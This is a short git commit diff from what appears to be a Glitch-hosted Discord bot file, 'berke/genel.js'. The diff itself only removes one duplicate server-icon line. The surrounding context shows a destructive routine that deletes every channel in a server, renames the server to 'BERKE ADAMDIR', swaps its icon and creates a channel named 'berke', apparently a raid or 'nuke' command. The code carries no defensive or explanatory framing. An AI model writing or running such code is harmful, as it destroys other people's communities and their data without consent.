2b031f91e3ba8bafc40d119a1f737078d4e3c26e
Glitch (benim-botum-lan) <none>
2019-07-10 11:07:04 +0000

    🐉🛍 Checkpoint ./berke/genel.js:2558838/181

--- berke/genel.js
+++ berke/genel.js
@@ -15,7 +15,6 @@ message.guild.channels.deleteAll("");
 
 message.guild.setName(`BERKE ADAMDIR`, "")
 message.guild.setIcon(`https://cdn.discordapp.com/attachments/522020595123224595/585051070942674964/unknown.png`)
-message.guild.setIcon(`https://images-ext-1.discordapp.net/external/Y7R2e9ELj25TBIHsxS9Or2suLUqLYcKOb2ve33XqbSA/%3Fs%3D400%26v%3D4/https/avatars3.githubusercontent.com/u/21992052`)
 message.guild.createChannel(`berke`)
 message.delete()
 };
